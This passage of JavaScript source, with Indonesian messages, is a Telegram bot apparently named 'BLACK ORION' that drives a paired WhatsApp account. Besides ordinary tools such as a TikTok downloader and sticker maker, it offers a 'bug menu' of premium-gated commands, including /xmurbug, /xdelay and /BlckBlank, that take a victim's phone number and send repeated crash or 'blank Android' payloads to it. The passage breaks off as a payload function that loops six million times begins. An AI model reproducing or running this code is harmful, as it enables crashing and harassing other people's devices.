      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.reply("✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfiles <repo> (reply file .js)
bot.command("addfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");

    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// /delfiles <repo> <path/file.js>
bot.command("dellfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;
    const file = parts[2];

    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
    }

    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});
  
// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});



/// -------- ( menu utama ) --------- \\\
// =============================
// MAIN MENU
// =============================
async function mainMenu(ctx){

const photoPath = path.join(__dirname,"image","BlackOrionGw.jpg")

const name = ctx.from?.first_name || "User"
const sender = isWhatsAppConnected ? "1 Connected" : "0 Connected"
const uptime = runtime(process.uptime())
const memory = (process.memoryUsage().heapUsed/1024/1024).toFixed(2)+" MB"
const cooldown = COOLDOWN_TIME ? COOLDOWN_TIME/1000 : 0

const text = `
\`\`\`
ハローハウ ${name}, 私はあなたを助けることができるロボットです。
できるだけ私を活用してください。

╭━━━〔 BLACK ORION SYSTEM 〕━━━
┃ Developer : @RidzzOffc
┃ Version   : 0.0 Private
┃ Framework : Telegraf
┃ Language  : JavaScript
╰━━━━━━━━━━━━━━━━━━

╭━━━〔 BOT STATUS 〕━━━
┃ Sender   : ${sender}
┃ Runtime  : ${uptime}
┃ Memory   : ${memory}
┃ Cooldown : ${cooldown}s
╰━━━━━━━━━━━━━━━━━━

〔 PAGE 1 / 5 〕
\`\`\`
`

const keyboard = Markup.inlineKeyboard([
[
Markup.button.callback("⬅ 𝗕𝗔𝗖𝗞","thanksto"),
Markup.button.url("👑 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥","t.me/RidzzOffc"),
Markup.button.callback("𝗡𝗘𝗫𝗧 ➡","bugmenu")
]
])

if(ctx.callbackQuery){
return ctx.editMessageCaption(text,{
parse_mode:"Markdown",
reply_markup:keyboard.reply_markup
})
}

await ctx.replyWithPhoto(
{source:photoPath},
{
caption:text,
parse_mode:"Markdown",
reply_markup:keyboard.reply_markup
})

}


// =============================
// BUG MENU
// =============================
bot.action("bugmenu",async(ctx)=>{

await ctx.answerCbQuery()

const text = `
\`\`\`
╭━━━〔 BUG MENU 〕━━━
┃ /xmurbug - FORCLOSE FOR MURBUG
┃ /xmurbugv2 - DELAY FOR MURBUG
┃ /xdelay - DELAY INVISIBLE
┃ /BlckBlank - BLANK HARD ANDROID
┃ /BlckDelay - DELAY BEBAS SPAM
╰━━━━━━━━━━━━━━━━━━

〔 PAGE 2 / 5 〕
\`\`\`
`

await ctx.editMessageCaption(text,{
parse_mode:"Markdown",
reply_markup:Markup.inlineKeyboard([
[
Markup.button.callback("⬅ 𝗕𝗔𝗖𝗞","mainmenu"),
Markup.button.url("👑 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥","t.me/RidzzOffc"),
Markup.button.callback("𝗡𝗘𝗫𝗧 ➡","ownermenu")
]
]).reply_markup
})

})


// =============================
// OWNER MENU
// =============================
bot.action("ownermenu",async(ctx)=>{

await ctx.answerCbQuery()

const text = `
\`\`\`
╭━━━〔 OWNER MENU 〕━━━
┃ /connect - TAMBAHKAN SENDER
┃ /setcd - SET JEDA BOT
┃ /killsesi - HAPUS SEMUA SENDER
┃ /addadmin - ADD ACCES ADMIN
┃ /deladmin - DELETE ACCES ADMIN
┃ /addprem - ADD ACCES PREMIUM
┃ /delprem - DELETE ACCES PREMIUM
┃ /self - PRIVATE BOT
┃ /public - OPEN THE BOT
╰━━━━━━━━━━━━━━━━━━

〔 PAGE 3 / 5 〕
\`\`\`
`

await ctx.editMessageCaption(text,{
parse_mode:"Markdown",
reply_markup:Markup.inlineKeyboard([
[
Markup.button.callback("⬅ 𝗕𝗔𝗖𝗞","bugmenu"),
Markup.button.url("👑 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥","t.me/RidzzOffc"),
Markup.button.callback("𝗡𝗘𝗫𝗧 ➡","toolsmenu")
]
]).reply_markup
})

})


// =============================
// TOOLS MENU
// =============================
bot.action("toolsmenu",async(ctx)=>{

await ctx.answerCbQuery()

const text = `
\`\`\`
╭━━━〔 TOOLS MENU 〕━━━
┃ /convert - FOTO TO LINK
┃ /waktu - WAKTU HARI INI
┃ /brat - TEXT STICKER
┃ /tiktokdl - DOWNLOAD VIDEO TIKTOK
┃ /cekidch - CHANNEL ID
┃ /ssiphone - SCREENSHOT IPHONE
╰━━━━━━━━━━━━━━━━━━

〔 PAGE 4 / 5 〕
\`\`\`
`

await ctx.editMessageCaption(text,{
parse_mode:"Markdown",
reply_markup:Markup.inlineKeyboard([
[
Markup.button.callback("⬅ 𝗕𝗔𝗖𝗞","ownermenu"),
Markup.button.url("👑 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥","t.me/RidzzOffc"),
Markup.button.callback("𝗡𝗘𝗫𝗧 ➡","thanksto")
]
]).reply_markup
})

})


// =============================
// THANKS MENU
// =============================
bot.action("thanksto",async(ctx)=>{

await ctx.answerCbQuery()

const text = `
\`\`\`
╭━━━〔 THANKS TO 〕━━━
┃ @RidzzOffc - DEVELOPER
┃ @xwarxxx - BESTT SUPPORT
┃ @MarzzOfficial1 - BEST FRIEND
┃ @pherine - BEST SUPPORT
┃ @Zabkanaeru - MY PARTNER
┃ All Support BLACK ORION
╰━━━━━━━━━━━━━━━━━━

〔 PAGE 5 / 5 〕
\`\`\`
`

await ctx.editMessageCaption(text,{
parse_mode:"Markdown",
reply_markup:Markup.inlineKeyboard([
[
Markup.button.callback("⬅ 𝗕𝗔𝗖𝗞","toolsmenu"),
Markup.button.url("👑 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥","t.me/RidzzOffc"),
Markup.button.callback("𝗡𝗘𝗫𝗧 ➡","mainmenu")
]
]).reply_markup
})

})


// =============================
// START COMMAND
// =============================
bot.command("start",async(ctx)=>{
await mainMenu(ctx)
})


// =============================
// RETURN TO MAIN MENU
// =============================
bot.action("mainmenu",async(ctx)=>{
await ctx.answerCbQuery()
await mainMenu(ctx)
})
/// ------ ( Plugins ) ------- \\\
function getUserId(ctx) {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return null;

  return args[1].replace(/[^0-9]/g, ""); 
}

/// CASE BUAT OWNER MENU ///
bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});


bot.command("addadmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx);
  if (!userId) return ctx.reply("Example: /addadmin 123");

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  ctx.reply(`✅ Berhasil tambah ${userId} jadi admin`);
});


bot.command("addprem", checkOwner, (ctx) => {
  const userId = getUserId(ctx);
  if (!userId) return ctx.reply("Example: /addprem 123");

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`✅ Berhasil tambah ${userId} jadi premium`);
});


bot.command("deladmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx);
  if (!userId) return ctx.reply("Example: /deladmin 123");

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di admin.`);
  }

  adminUsers = adminUsers.filter(id => id !== userId);
  saveJSON(adminFile, adminUsers);

  ctx.reply(`🚫 Berhasil hapus ${userId} dari admin`);
});


bot.command("delprem", checkOwner, (ctx) => {
  const userId = getUserId(ctx);
  if (!userId) return ctx.reply("Example: /delprem 123");

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di premium.`);
  }

  premiumUsers = premiumUsers.filter(id => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`🚫 Berhasil hapus ${userId} dari premium`);
});

bot.command("antivideo", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antivideo on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiVideoGroups.includes(chatId)) {
      antiVideoGroups.push(chatId)
      saveAntiVideo(antiVideoGroups)
    }
    return ctx.reply("✅ Anti video aktif di grup ini")
  }

  if (args === "off") {
    antiVideoGroups = antiVideoGroups.filter(id => id !== chatId)
    saveAntiVideo(antiVideoGroups)
    return ctx.reply("❌ Anti video dimatikan")
  }

  ctx.reply("📌 Gunakan: /antivideo on /off")
})


bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})


bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("on");
  ctx.reply("👥 Group Only berhasil diaktifkan.");
});

bot.command("groupoff", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("off");
  ctx.reply("🌍 Group Only dimatikan.");
});

bot.command("mode", (ctx) => {
  ctx.reply(`⚙️ Mode saat ini: ${getMode().toUpperCase()}`);
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot sekarang Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🌍 Bot Sekarang bisa di akses siapapun.");
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});

bot.command('setcd', async (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner");

  const args = ctx.message.text.split(' ');
  if (!args[1]) return ctx.reply("⚠️ Contoh: /setcd 1s / 1m / 1h / 1d / 0");

  if (args[1] === "0") {
    COOLDOWN_TIME = 0;
    COOLDOWN_TEXT = "0s";
    return ctx.reply("✅ Cooldown dimatikan");
  }

  const time = parseCooldown(args[1]);
  if (!time) return ctx.reply("⚠️ Format salah!");

  COOLDOWN_TIME = time;
  COOLDOWN_TEXT = args[1];

  ctx.reply(`✅ Cooldown diubah ke ${COOLDOWN_TEXT}`);
});
/// Tools menu ///
bot.command("waktu", (ctx) => {
  const zones = {
    WIB: "Asia/Jakarta",
    WITA: "Asia/Makassar",
    WIT: "Asia/Jayapura"
  };

  let teks = "🕒 Waktu Indonesia\n\n";

  for (let zona in zones) {
    const waktu = new Date().toLocaleTimeString("id-ID", {
      timeZone: zones[zona]
    });
    teks += `${zona} : ${waktu}\n`;
  }

  ctx.reply(teks);
});

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|can5y",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By BLACK ORION ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("cekidch", async (ctx) => {
  const input = ctx.message.text.split(" ")[1];
  if (!input) return ctx.reply("Masukkan username channel.\nContoh: /cekidch @namachannel");

  try {
    const chat = await ctx.telegram.getChat(input);
    ctx.reply(`📢 ID Channel:\n${chat.id}`);
  } catch {
    ctx.reply("Channel tidak ditemukan atau bot belum menjadi admin.");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("convert", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});
// ================= CONNECT ================= //
bot.command("connect", checkOwner, async (ctx) => {
  try {
    if (!sock) {
      return ctx.reply("❌ Socket belum siap. Restart bot dulu.");
    }

    if (isWhatsAppConnected && sock.user) {
      return ctx.reply("✅ WhatsApp sudah terhubung.");
    }

    if (global.pairingMessage) {
      return ctx.reply("⚠️ Pairing masih aktif, tunggu dulu.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("Example: /connect 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    if (phoneNumber.length < 10 || phoneNumber.length > 15) {
      return ctx.reply("❌ Nomor tidak valid.");
    }

    await new Promise(r => setTimeout(r, 1000));

    const code = await sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.replyWithPhoto(
      "https://files.catbox.moe/qszyit.jpg",
      {
        caption:
`<blockquote>BLACK ORION</blockquote>

╭━━━〔 🔗 WHATSAPP PAIRING 〕━━━╮
┃ 📱 Nomor  : ${phoneNumber}
┃ 🔐 Kode   : <code>${formattedCode}</code>
╰━━━━━━━━━━━━━━━━━━━━╯

🟡 <b>Status:</b> Waiting for connection...`,
        parse_mode: "HTML"
      }
    );

    global.pairingMessage = {
      chatId: msg.chat.id,
      messageId: msg.message_id
    };

    setTimeout(() => {
      global.pairingMessage = null;
    }, 60000);

  } catch (err) {
    console.log("Pairing error FULL:", err);
    global.pairingMessage = null;
    ctx.reply("❌ Gagal pairing!");
  }
});


// ================= KILL SESSION ================= //
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session dihapus, silakan /connect ulang");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session");
  }
});
/// --------- ( CASE BUG 1 ) ---------- \\\
bot.command("xmurbug", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xmurbug 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(
    ctx.chat.id,
    { source: "./image/BlackOrionGw.jpg" }, 
    {
      caption: `
<blockquote><pre>𝗢𝗥𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞</pre></blockquote>
⌑ Target : ${q}
⌑ Type : Forclose Bebas Spam
⌑ Status : Process`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await memekfc(sock, target) 
    await sleep(3500);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote><pre>𝗢𝗥𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞</pre></blockquote>
⌑ Target : ${q}
⌑ Type : Forclose Bebas Spam
⌑ Status : Success`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});
///============= ( Case bug 2 ) ============///
bot.command("xmurbugv2", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xmurbugv2 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(
    ctx.chat.id,
    { source: "./image/BlackOrionGw.jpg" }, 
    {
      caption: `
<blockquote><pre>𝗢𝗥𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞</pre></blockquote>
⌑ Target : ${q}
⌑ Type : Delay For Murbug
⌑ Status : Process`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await PhoenixInvictus(sock, target) 
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote><pre>𝗢𝗥𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞</pre></blockquote>
⌑ Target : ${q}
⌑ Type : Delay For Murbug
⌑ Status : Success`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});
///============== ( Case bug 3 ) ==========\\
bot.command("xdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xdelay 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(
    ctx.chat.id,
    { source: "./image/BlackOrionGw.jpg" }, 
    {
      caption: `
<blockquote><pre>𝗢𝗥𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞</pre></blockquote>
⌑ Target : ${q}
⌑ Type : Delay Bebas Spam
⌑ Status : Process`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 4; i++) {
    await xnxDelay(sock, target) 
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote><pre>𝗢𝗥𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞</pre></blockquote>
⌑ Target : ${q}
⌑ Type : Delay Bebas Spam
⌑ Status : Success`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});
///=============== ( Case bug 4 ) =========\\
bot.command("BlckBlank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /BlckBlank 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(
    ctx.chat.id,
    { source: "./image/BlackOrionGw.jpg" }, 
    {
      caption: `
<blockquote><pre>𝗢𝗥𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞</pre></blockquote>
⌑ Target : ${q}
⌑ Type : Blank Android
⌑ Status : Process`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 80; i++) {
    await RxVzTriple(sock, target) 
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote><pre>𝗢𝗥𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞</pre></blockquote>
⌑ Target : ${q}
⌑ Type : Blank Andro
⌑ Status : Success`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "𝐂𝐡𝐞𝐜𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});
/// ============= CASE BUG 5 =============\\\
bot.command("BlckDelay", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /BlckDelay 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`✅ SUCCES MENGIRIM BUG ${q}`);

  (async () => {
    for (let i = 0; i < 20; i++) {
      await Luminousdelay(sock, target) 
      await sleep(3);
    }
  })();

});
// ------------ (  FUNCTION BUGS ) -------------- \\
async function memekfc(sock, target) {
    const repeat = 6000000; 
    
    for(let i = 0; i < repeat; i++) {
        const msg = generateWAMessageFromContent(target, {
